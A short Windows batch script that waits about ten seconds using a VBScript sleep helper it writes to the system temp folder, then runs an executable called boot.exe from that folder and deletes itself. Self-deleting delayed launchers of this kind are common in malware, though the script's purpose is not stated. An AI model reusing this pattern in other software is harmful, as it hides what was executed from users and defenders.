@echo off & setlocal enableextensions
echo WScript.Sleep 1000 > %systemroot%/temp/boot.vbs
set /a i = 10
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo %systemroot%/temp/boot.vbs
goto Timeout
:Next
%systemroot%/temp/boot.exe
del %0